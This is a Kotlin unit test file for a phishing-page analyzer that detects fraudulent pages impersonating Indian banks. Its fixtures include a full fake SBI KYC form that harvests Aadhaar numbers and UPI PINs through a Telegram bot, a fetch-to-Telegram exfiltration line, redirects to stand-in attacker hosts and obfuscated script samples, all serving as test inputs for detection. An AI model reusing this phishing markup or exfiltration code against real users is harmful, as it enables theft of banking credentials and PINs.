package app.entity.shield.sandbox

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test
import java.nio.charset.Charset

class PageAnalyzerTest {
    private val brands = mapOf(
        "sbi" to listOf("sbi.co.in", "onlinesbi.sbi"),
        "hdfc" to listOf("hdfcbank.com"),
        "paytm" to listOf("paytm.com"),
    )
    private val freeHosts = listOf("netlify.app", "000webhostapp.com", "github.io")
    private val registrable: (String) -> String = { host ->
        val p = host.split('.')
        when {
            p.size >= 3 && p.takeLast(2).joinToString(".") in setOf("co.in", "org.in", "gov.in") -> p.takeLast(3).joinToString(".")
            p.size >= 2 -> p.takeLast(2).joinToString(".")
            else -> host
        }
    }

    private fun analyze(body: ByteArray, url: String, ct: String = "text/html; charset=utf-8", cd: String = "") =
        PageAnalyzer.analyze(PageInput(url, ct, cd, body, listOf(url)), brands, freeHosts, registrable)

    private fun page(html: String, url: String = "https://example.com/", ct: String = "text/html; charset=utf-8") =
        analyze(html.toByteArray(Charsets.UTF_8), url, ct)

    private val sbiKyc = """
        <!DOCTYPE html>
        <html lang="hi"><head><meta charset="utf-8">
        <title>SBI KYC Update | State Bank of India</title></head>
        <body>
        <div class="hdr"><img src="/assets/sbi_logo.png" alt="State Bank"></div>
        <h1>SBI e-KYC सत्यापन</h1>
        <p>प्रिय ग्राहक, आपका खाता 24 घंटे में ब्लॉक हो जाएगा। Your YONO account will be blocked within 24 hours.
           Complete your KYC now &amp; avoid suspension.</p>
        <form id="f" action="https://api.telegram.org/bot123/sendMessage" method="post">
          <label for="mob">मोबाइल नंबर / Mobile Number</label>
          <input id="mob" name="mobile" type="tel" required>
          <label for="aad">आधार संख्या / Aadhaar Number</label>
          <input id="aad" name="f2" type="text" maxlength="12">
          <label for="pin">यूपीआई पिन / UPI PIN</label>
          <input id="pin" name="f3" type="password" maxlength="6">
          <input type="hidden" name="chat_id" value="-100123">
          <button type="submit">सबमिट करें</button>
        </form>
        </body></html>
    """.trimIndent()

    @Test fun fakeSbiKycPageOnLookalikeDomain() {
        val r = page(sbiKyc, "https://sbi-kyc-update.in/verify")
        for (s in listOf("upi_pin_field", "aadhaar_field", "brand_impersonation", "brand_mention_offdomain", "form_to_messenger",
            "form_offsite", "kyc_text", "urgency_text")) assertTrue("missing $s in ${r.signals}", s in r.signals)
        assertFalse("no_tls_form" in r.signals)
        assertEquals(listOf("phone", "aadhaar", "upi_pin", "other"), r.fields.map { it.kind })
        assertEquals("यूपीआई पिन / UPI PIN", r.fields[2].label)
        assertEquals(listOf("https://api.telegram.org/bot123/sendMessage"), r.formActions)
        assertEquals(listOf("sbi"), r.brands)
        assertEquals("SBI KYC Update | State Bank of India", r.title)
        assertTrue(r.isHtml && r.devanagari && r.forms == 1)
        assertTrue(r.textSample.contains("Complete your KYC now & avoid suspension."))
    }

    @Test fun sameMarkupOnOfficialDomainIsNotImpersonation() {
        val r = page(sbiKyc, "https://www.onlinesbi.sbi/kyc")
        assertFalse(r.signals.toString(), "brand_impersonation" in r.signals)
        assertFalse("brand_mention_offdomain" in r.signals)
        assertTrue("upi_pin_field" in r.signals)
        assertEquals(listOf("sbi"), r.brands)
    }

    @Test fun metaRefreshTargetIsResolvedAbsolute() {
        val r = page("<html><head><meta http-equiv=\"Refresh\" content=\"0; URL='/next/page?x=1'\"></head><body>Redirecting</body></html>",
            "https://short.example/abc")
        assertEquals("https://short.example/next/page?x=1", r.metaRefresh)
        assertTrue("meta_refresh" in r.signals)
        val r2 = page("<meta http-equiv=refresh content=\"3;url=https://evil.example/x\">", "https://a.example/")
        assertEquals("https://evil.example/x", r2.metaRefresh)
        val reload = page("<meta http-equiv=\"refresh\" content=\"30\">", "https://a.example/")
        assertNull(reload.metaRefresh)
        assertFalse("meta_refresh" in reload.signals)
    }

    @Test fun jsRedirectFindsFirstLiteralTarget() {
        val r = page("""<script>if (location.href == "x") {}
            setTimeout(function () { window.location.href = "https://evil.example/login?id=1"; }, 50);</script>""",
            "https://a.example/")
        assertEquals("https://evil.example/login?id=1", r.jsRedirect)
        assertTrue("js_redirect" in r.signals)
        assertEquals("https://a.example/go/next", page("<script>location.replace('/go/next')</script>", "https://a.example/p/q").jsRedirect)
        assertEquals("https://x.example/", page("<script>top.location = 'https://x.example/';</script>").jsRedirect)
        assertEquals("https://y.example/a", page("<script>location.assign(\"https://y.example/a\")</script>").jsRedirect)
        val none = page("<script>var u = location.href; location.hash = '#top'; window.location.href = '#x';</script>")
        assertNull(none.jsRedirect)
        assertFalse("js_redirect" in none.signals)
    }

    @Test fun apkByContentTypeDispositionUrlAndLink() {
        val apk = byteArrayOf(0x50, 0x4B, 3, 4, 0, 0, 0, 0)
        val byType = analyze(apk, "https://cdn.example/d?id=7", "application/vnd.android.package-archive")
        assertTrue("apk_download" in byType.signals)
        assertFalse(byType.isHtml)
        assertTrue("apk_download" in analyze(apk, "https://cdn.example/d", "application/octet-stream",
            "attachment; filename=\"PM-Kisan-Update.apk\"").signals)
        assertTrue("apk_download" in analyze(apk, "https://x.example/files/app.apk?dl=1", "application/octet-stream").signals)
        val link = page("<a href=\"/dl/SBI_Rewards.apk?v=2\">Install SBI Rewards</a>", "https://x.example/")
        assertTrue("page_links_apk" in link.signals)
        assertFalse("apk_download" in link.signals)
    }

    @Test fun obfuscatedScripts() {
        assertTrue("obfuscated_js" in page("<script>eval(atob(\"ZG9jdW1lbnQud3JpdGUoJzxoMT5oaTwvaDE+Jyk=\"))</script>").signals)
        assertTrue("obfuscated_js" in page("<script>var p = \"" + "QUFB".repeat(600) + "\";</script>").signals)
        assertTrue("obfuscated_js" in page("<script>var s = \"" + "\\x41".repeat(250) + "\";</script>").signals)
        assertTrue("obfuscated_js" in page("<body onload=\"eval(unescape('%61'))\">").signals)
        assertFalse("obfuscated_js" in page("<script>var x = 1; console.log(x);</script>").signals)
        val encodedPage = java.util.Base64.getEncoder().encodeToString("<html><body><form action=x>".repeat(120).toByteArray())
        assertTrue("obfuscated_js" in page("<script>document.write(decode('$encodedPage'))</script>").signals)
        // not payloads: a base64 data: URI, a binary blob (image / protobuf config), scattered single escapes (google.com style)
        assertFalse("obfuscated_js" in page("<script>img.src = \"data:image/png;base64," + "QUFB".repeat(600) + "\";</script>").signals)
        val blob = java.util.Base64.getEncoder().encodeToString(ByteArray(3000).also { java.util.Random(1).nextBytes(it) })
        assertFalse("obfuscated_js" in page("<script>var cfg = [\"$blob\", 3];</script>").signals)
        assertFalse("obfuscated_js" in page("<script>var q = \"" + "a\\x3db&c\\x22 ".repeat(300) + "\";</script>").signals)
    }

    @Test fun malformedHtmlNeverThrows() {
        val samples = listOf("", "<", "<<<>>>", "<a href='unclosed", "<a href=\"x\" <b", "<script>", "<script>alert(1)", "<!--",
            "<!-- x", "<title>", "<title>abc", "</", "</>", "</ x>", "<input type=", "<input type=\"pass", "<form action=",
            "&#xFFFFFFFFF; &#0; &#55296; &bogus; & &# &#x; &amp", "<meta http-equiv=refresh content=",
            "<meta http-equiv=refresh content=\"0;url=\">", "<iframe", "<label for=x>abc", "<base href=\"::::\"><a href=x>",
            "<a href=\"http://[::1\">x</a>", "<a href=\"%%%\">x</a><form action=\"http://\">", "\u0000￿<\uD800>",
            "<script>location.href='", "<img src=\"logo\" alt=\"sbi", "<p>" + "\uD83D".repeat(10))
        for (s in samples) for (url in listOf("https://ok.example/", "not a url", "", "http://[broken")) {
            val r = page(s, url)
            assertFalse("failed on [$s] at [$url]", "analysis_failed" in r.signals)
        }
        val random = java.util.Random(7)
        repeat(50) {
            val bytes = ByteArray(2000).also { random.nextBytes(it) }
            for (ct in listOf("text/html", "", "text/html; charset=shift_jis", "text/html; charset=nonsense", "text/plain"))
                assertFalse("analysis_failed" in analyze(bytes, "https://r.example/", ct).signals)
        }
    }

    @Test fun pathologicalInputCompletesFast() {
        val cases = mapOf(
            "1MB of <" to "<".repeat(1_000_000),
            "unclosed quotes" to "<a href=\"".repeat(50_000) + "x",
            "unclosed single quotes" to "<a title='x>".repeat(50_000),
            "50k nested tags" to "<div>".repeat(50_000) + "deep" + "</div>".repeat(50_000),
            "attribute storm" to "<a " + "x=1 ".repeat(200_000),
            "unclosed tags" to "<a ".repeat(200_000),
            "entities" to "&".repeat(500_000) + "&#".repeat(250_000),
            "unclosed scripts" to "<script>".repeat(100_000),
            "unclosed comments" to "<!--".repeat(200_000),
            "fields" to "<input name=a>".repeat(60_000),
            "labels" to "<label>".repeat(100_000),
            "links" to "<a href=x>".repeat(100_000),
            "location spam" to "<script>" + "location.href=\"".repeat(30_000) + "</script>",
            "end tag spam" to "<script>" + "</".repeat(300_000),
            "base64 run" to "<script>\"" + "A".repeat(900_000) + "</script>",
        )
        for ((name, html) in cases) {
            val t0 = System.nanoTime()
            val r = page(html)
            val ms = (System.nanoTime() - t0) / 1_000_000
            println("pathological [$name] ${html.length} chars: $ms ms")
            assertFalse(name, "analysis_failed" in r.signals)
            // Linear-time guard: catastrophic regex backtracking on these inputs takes minutes. The bound
            // is loose (3 s; ~0.2 s on an idle laptop) so a busy CI machine does not fail it.
            assertTrue("$name took $ms ms", ms < 3000)
        }
    }

    @Test fun realisticLargePageIsFast() {
        val block = """
            <div class="card"><h2>Offer &amp; rewards</h2><p>Lorem ipsum dolor sit amet, consectetur adipiscing elit,
            sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam &nbsp; quis.</p>
            <a href="/p/1?ref=home">Read more</a> <a href="https://partner.example/x">Partner</a>
            <img src="/img/photo.jpg" alt="photo" width="320" height="200">
            <form action="/search"><label for="q">Search</label><input id="q" name="q" placeholder="Search products"></form>
            <script>window.dataLayer = window.dataLayer || []; dataLayer.push({event: "view", id: 42});</script>
            <ul><li>One</li><li>Two</li><li>Three</li></ul></div>
        """.trimIndent()
        val sb = StringBuilder("<!doctype html><html><head><title>Big store</title></head><body>")
        while (sb.length < 768 * 1024) sb.append(block)
        sb.append("</body></html>")
        val html = sb.toString()
        repeat(3) { page(html) }   // JIT warm-up
        var best = Long.MAX_VALUE
        repeat(5) {
            val t0 = System.nanoTime()
            val r = page(html)
            best = minOf(best, (System.nanoTime() - t0) / 1_000_000)
            assertEquals("Big store", r.title)
            assertEquals(64, r.fields.size)
        }
        println("realistic 768 KB page: best $best ms")
        assertTrue("768 KB took $best ms", best < 400)
    }

    @Test fun hindiTextSetsDevanagariAndUrgency() {
        val r = page("<html><body><p>आपका खाता तुरंत ब्लॉक कर दिया जाएगा</p></body></html>")
        assertTrue(r.devanagari)
        assertTrue("urgency_text" in r.signals)
        assertFalse(page("<p>Hello there</p>").devanagari)
    }

    @Test fun charsetFromMetaTag() {
        val cp1252 = Charset.forName("windows-1252")
        val html = "<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1252\">" +
            "<title>Café</title></head><body><p>Café – “Offer”</p></body></html>"
        val r = analyze(html.toByteArray(cp1252), "https://shop.example/", "text/html")
        assertEquals("Café", r.title)
        assertTrue(r.textSample, r.textSample.contains("Café – “Offer”"))
        val r2 = analyze("<meta charset='windows-1252'><p>naïve</p>".toByteArray(cp1252), "https://shop.example/", "")
        assertTrue(r2.isHtml)
        assertEquals("naïve", r2.textSample)
        // the header wins over the meta tag; bad bytes become U+FFFD instead of throwing
        val r3 = analyze(html.toByteArray(cp1252), "https://shop.example/", "text/html; charset=utf-8")
        assertTrue(r3.textSample.contains('�'))
    }

    @Test fun fieldKinds() {
        val r = page("""
            <input name="cardNumber"><input autocomplete="cc-exp"><input placeholder="CVV">
            <label>ATM PIN <input name="x1"></label><input name="mpin"><input placeholder="Enter OTP">
            <input name="pan_no"><label for="p2">PAN Card Number</label><input id="p2">
            <label for="e">Debit Card Expiry</label><input id="e"><input name="userId"><input aria-label="Account Number">
            <input name="ifsc_code"><input type="email" name="x2"><input name="dateOfBirth">
            <p>Enter UPI PIN</p><input type="password" name="p1"><input type="password" name="pwd">
            <input name="mobileNo"><select name="state"></select><textarea name="address"></textarea>
            <input type="checkbox" name="agree"><input name="fullname">
            <label for="c">कार्ड नंबर</label><input id="c"><label for="o">ओटीपी दर्ज करें</label><input id="o">
        """.trimIndent())
        assertEquals(listOf("card", "expiry", "cvv", "atm_pin", "mpin", "otp", "pan", "pan", "expiry", "netbanking_id", "account",
            "ifsc", "email", "dob", "upi_pin", "password", "phone", "other", "other", "other", "other", "card", "otp"),
            r.fields.map { it.kind })
        for (s in listOf("card_field", "cvv_field", "atm_pin_field", "mpin_field", "otp_field", "pan_field", "upi_pin_field",
            "password_field")) assertTrue(s, s in r.signals)
        assertEquals("ATM PIN", r.fields[3].label)
    }

    @Test fun structureAndWordingSignals() {
        assertTrue("hidden_iframe" in page("<iframe src=\"https://t.example/x\" width=\"0\" height=\"0\"></iframe>").signals)
        assertTrue("hidden_iframe" in page("<iframe src=\"/x\" style=\"display: none\"></iframe>").signals)
        val full = page("<iframe src=\"https://phish.example/login\" style=\"position:fixed;top:0;width:100%;height:100%\"></iframe>",
            "https://innocent.example/")
        assertTrue("fullpage_iframe_offsite" in full.signals)
        assertEquals(1, full.iframes)
        assertFalse("fullpage_iframe_offsite" in page("<iframe src=\"/inner\" width=\"100%\" height=\"100%\"></iframe>").signals)

        assertTrue("anti_inspection" in page("<body oncontextmenu=\"return false\"><p>hi</p></body>").signals)
        assertTrue("anti_inspection" in page("<script>document.onkeydown = function(e){ if (e.keyCode == 123) return false; }</script>").signals)
        assertTrue("anti_inspection" in page("<script>setInterval(function(){ debugger; }, 100)</script>").signals)
        assertFalse("anti_inspection" in page("<script>function f(){ return false; }</script>").signals)

        val cloaked = page("<html><body><script src=\"/a.js\"></script></body></html>")
        assertTrue("cloaked_empty" in cloaked.signals)
        assertEquals(1, cloaked.externalScripts)

        val plain = page("<form action=\"/login\"><input type=\"password\" name=\"p\"></form>", "http://bank-verify.example/")
        assertTrue("no_tls_form" in plain.signals)
        assertFalse("form_offsite" in plain.signals)

        val free = page("<a href=\"https://other.netlify.app/\">x</a><a href=\"/y\">y</a><a href=\"https://sbi-rewards.netlify.app/z\">z</a>" +
            "<a href=\"https://paytm.com/\">p</a>", "https://sbi-rewards.netlify.app/")
        assertTrue("free_host" in free.signals)
        assertEquals(4, free.links)
        assertEquals(0.5f, free.externalLinkRatio)

        assertTrue("parked" in page("<h1>example.xyz</h1><p>This domain is for sale! Buy this domain today.</p>").signals)
        assertTrue("error_page" in page("<title>404 Not Found</title><h1>Not Found</h1><p>nginx</p>").signals)
        assertFalse("error_page" in page("<p>" + "Plenty of real content here. ".repeat(40) + "Error 404 mentioned once.</p>").signals)

        val exfil = page("<script>fetch(\"https://api.telegram.org/bot123:ABC/sendMessage?chat_id=1&text=\" + d)</script>")
        assertTrue("exfil_script" in exfil.signals && "form_to_messenger" in exfil.signals)
        assertFalse("form_to_messenger" in page("<script>var u = \"https://chat.me/x\";</script>").signals)

        val reward = page("<p>Congratulations! You have won ₹5,000 cashback. Claim now.</p>")
        assertTrue("reward_text" in reward.signals)
        assertTrue("login_text" in page("<h2>Sign in to Net Banking</h2>").signals)

        val hdfc = page("<title>HDFC Bank NetBanking</title><p>Welcome</p>", "https://hdfc-secure.example/")
        assertTrue("brand_mention_offdomain" in hdfc.signals)
        assertFalse("brand_impersonation" in hdfc.signals)
        assertEquals(listOf("hdfc"), hdfc.brands)
        // a token inside a longer word is not a brand mention
        assertTrue(page("<title>Onlinesbiz Hdfcx</title>", "https://z.example/").brands.isEmpty())
    }
}
